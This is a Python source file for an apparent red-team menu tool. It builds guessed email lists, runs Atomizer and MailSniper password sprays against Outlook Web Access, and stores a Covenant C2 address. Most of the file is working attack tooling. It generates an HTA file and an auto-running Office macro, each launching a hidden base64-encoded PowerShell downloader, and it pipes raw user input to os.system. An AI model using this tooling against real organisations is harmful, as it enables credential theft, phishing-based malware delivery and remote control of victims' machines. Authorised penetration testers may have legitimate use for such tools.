#!/usr/bin/env python
# Red Team Monkey Glue

import readline
import subprocess
import os
import csv
import sys
import json

ver = "0.01"

scriptdir = os.path.dirname(os.path.abspath(__file__))

print("Red Team Monkey "+ver+"\n")

configd = {
    "domain":"",
    "owa_url":"",
    "covaddress":"",
    "psencode":"",
}

def initialize():
    global configd
    if os.path.exists("config.txt"):
        configd = json.load(open("config.txt"))
    main_menu()

def display_config():
    global configd
    print("\r\nCurrent config")
    #print(configd["comp_name"] + " - " + configd["ip"])
    print("----------------")
    print("Current domain: " + configd["domain"])
    print("OWA Url: " + configd["owa_url"])
    print("----------------\r\n")

def save_config():
    global configd
    json.dump(configd, open("config.txt",'w'))

def main_menu():
    choice = ""
    global configd

    while choice != "0":

        display_config()

        print("Main menu")
        print("=========")
        print("1. Recon")
        print("2. Initial Access")
        print("3. Credentials")

        extras_menu()

        print('0. exit')
        print('')

        choice = input(">")

        extras_choice(choice)

        if choice == '1':
            recon_menu()
        elif choice == '2':
            initial_access_menu()
        elif choice == '0':
            exit()

def extras_menu():
    print("")
    print("s. quick screenshot")
    print("x. run/log cmd")
    print("log. view log txt")
    print("")
    return

def extras_choice(choice):
    if choice == 's':
        screenshot()
    elif choice == "x":
        cmd = input("cmd> ")
        print("===")
        quick_log("Run cmd: "+cmd)
        cmd = cmd + " |tee -a log.txt"
        os.system(cmd)
        main_menu()
    elif choice == 'log':
        view_log()
    return

# SCREENSHOT SECTION
def screenshot():
    cmd = "gnome-screenshot -i"
    os.system(cmd)
    return

# RECON SECTION
def recon_menu():
    choice = ""
    global configd

    while choice != "0":

        display_config()

        print("\r\nRecon")
        print("=========")
        print("1. Open names.txt")
        print("2. Set @domain")
        print("3. Set OWA url")
        print("4. Generate possible emails")
        print("5. Run Atomizer pass spray")
        print("6. Mailsniper commands")

        extras_menu()

        print('0. exit')
        print('')

        choice = input(">")

        extras_choice(choice)

        if choice == '1':
            cmd = "nano names.txt"
            os.system(cmd)
        elif choice == '2':
            print("Current domain: "+configd["domain"])
            domain = input("new domain > ")
            if (domain != ""):
                configd["domain"] = domain
                save_config()
        elif choice == '3':
            print("Current owa URL: " + configd["owa_url"])
            owaurl = input("new owa url > ")
            if (owaurl != ""):
                configd["owa_url"] = owaurl
                save_config()
        elif choice == '4':
            print("Generating possible-emails.txt...")
            namemash()
            print("Done")
            quick_log("Generated possible-emails.txt")
        elif choice == '5':
            cmd = "/opt/SprayingToolkit/atomizer.py owa "+configd["owa_url"] + " "
            pass2spray = input("Password to try >")
            if (pass2spray != ""):
                cmd += pass2spray + " possible-emails.txt | tee -a log.txt"
                print (cmd)
                os.system(cmd)
        elif choice == '6':
            print("ipmo .\MailSniper.ps1")
            print("Invoke-PasswordSprayOWA -ExchHostname "+configd["owa_url"]+" -UserList possible-emails.txt -Password Spring2020")
            print("Get-GlobalAddressList -ExchHostname "+configd["owa_url"]+" -UserName user@"+configd["domain"]+" -Password Summer2020")
            print("Invoke-SelfSearch -Mailbox user@"+configd["domain"]+" -ExchHostname "+configd["owa_url"]+" -Remote -CheckAttachments -DownloadDir . -Folder all")
        if choice == '0':
            main_menu()

def initial_access_menu():
    choice = ""
    global configd

    while choice != "0":

        display_config()

        print("Main menu")
        print("=========")
        print("1. Covenant Address")
        print("2. Powershell HTTP Grunt code")
        print("3. Generate HTA downloader")
        print("4. Generate Office macro")

        extras_menu()

        print('0. exit')
        print('')

        choice = input(">")

        extras_choice(choice)

        if choice == '1':
            print("Current cov address: "+configd["covaddress"])
            covaddy = input("address > ")
            if (covaddy != ""):
                configd["covaddress"] = covaddy
                save_config()
        elif choice == '2':
            print("Current PS b64 encode: "+configd["psencode"])
            psencode = input("b64 code > ")
            if (psencode != ""):
                configd["psencode"] = psencode
                save_config()
        elif choice == '3':
            makehta()
        elif choice == '4':
            makeofficemacro()
        elif choice == '0':
            exit()

# LOGGING SECTION

def quick_log(txt):
    f = open("log.txt","a")
    f.write("\r\n"+txt+"\r\n")
    f.close
    return

def cmd_runlog(cmd):
    quick_log(cmd)
    cmd += " | tee -a log.txt"
    os.system(cmd)

def view_log():
    cmd = "less log.txt"
    os.system(cmd)
    return

# Code borrowed from namemash.py https://gist.github.com/superkojiman/11076951
def namemash():
    global configd
    domain = configd["domain"]
    f = open("possible-emails.txt","a")

    for line in open("names.txt"):
        name = ''.join([c for c in line if  c == " " or  c.isalpha()])

        tokens = name.lower().split()

        # skip empty lines
        if len(tokens) < 1:
            continue

        fname = tokens[0]
        lname = tokens[-1]

        f.write(fname + lname +"@"+domain+"\r\n")           # johndoe
        f.write(lname + fname +"@"+domain+"\r\n")           # doejohn
        f.write(fname + "." + lname +"@"+domain+"\r\n")     # john.doe
        f.write(lname + "." + fname +"@"+domain+"\r\n")     # doe.john
        f.write(lname + fname[0] +"@"+domain+"\r\n")        # doej
        f.write(fname[0] + lname +"@"+domain+"\r\n")        # jdoe
        f.write(lname[0] + fname +"@"+domain+"\r\n")        # djoe
        f.write(fname[0] + "." + lname +"@"+domain+"\r\n")  # j.doe
        f.write(lname[0] + "." + fname +"@"+domain+"\r\n")  # d.john
        f.write(fname +"@"+domain+"\r\n")                   # john
        f.write(lname +"@"+domain+"\r\n")                   # joe
    f.close

def makehta():
    global configd
    downloader = input("b64 enc downloader (empty to use ps b64) > ")
    if (downloader == ""):
        downloader = configd["psencode"]
    print("Outputting to download.hta and screen...")
    f = open("download.hta", "w")
    f.write("<script language=\"VBScript\">\r\n")
    print("<script language=\"VBScript\">")

    f.write("\tFunction DoStuff()\r\n")
    print("\tFunction DoStuff()")

    f.write("\t\tDim wsh\r\n")
    print("\t\tDim wsh")

    f.write("\t\tSet wsh = CreateObject(\"Wscript.Shell\")\r\n")
    print("\t\tSet wsh = CreateObject(\"Wscript.Shell\")")

    f.write("\t\twsh.run \"C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell -Sta -Nop -Window Hidden -EncodedCommand "+downloader+"\"\r\n")
    print("\t\twsh.run \"C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell -Sta -Nop -Window Hidden -EncodedCommand "+downloader+"\"")

    f.write("\t\tSet wsh = Nothing\r\n")
    print("\t\tSet wsh = Nothing")

    f.write("\tEnd Function\r\n")
    print("\tEnd Function")

    f.write("\tDoStuff\r\n")
    print("\tDoStuff")

    f.write("\tself.close\r\n")
    print("\tself.close")

    f.write("</script>\r\n")
    print("</script>")
    f.close
    quick_log("Generated downloader.hta")

def makeofficemacro():
    global configd
    downloader = input("b64 enc downloader (empty to use ps b64) > ")
    if (downloader == ""):
        downloader = configd["psencode"]
    print("Outputting to office-macro.txt and screen...")
    f = open("office-macro.txt", "w")

    f.write("Sub DoStuff()\r\n")
    print("Sub DoStuff()")

    f.write("\tDim wsh As Object\r\n")
    print("\tDim wsh As Object")

    f.write("\tSet wsh = CreateObject(\"Wscript.Shell\")\r\n")
    print("\tSet wsh = CreateObject(\"Wscript.Shell\")")

    f.write(
        "\twsh.Run \"powershell -Sta -Nop -Window Hidden -EncodedCommand " + downloader + "\"\r\n")
    print(
        "\twsh.Run \"powershell -Sta -Nop -Window Hidden -EncodedCommand " + downloader + "\"")

    f.write("\tSet wsh = Nothing\r\n")
    print("\tSet wsh = Nothing")

    f.write("End Sub\r\n")
    print("End Sub")

    f.write("Sub AutoOpen()\r\n")
    print("Sub AutoOpen()")

    f.write("\tDoStuff\r\n")
    print("\tDoStuff")

    f.write("End Sub\r\n")
    print("End Sub")

initialize()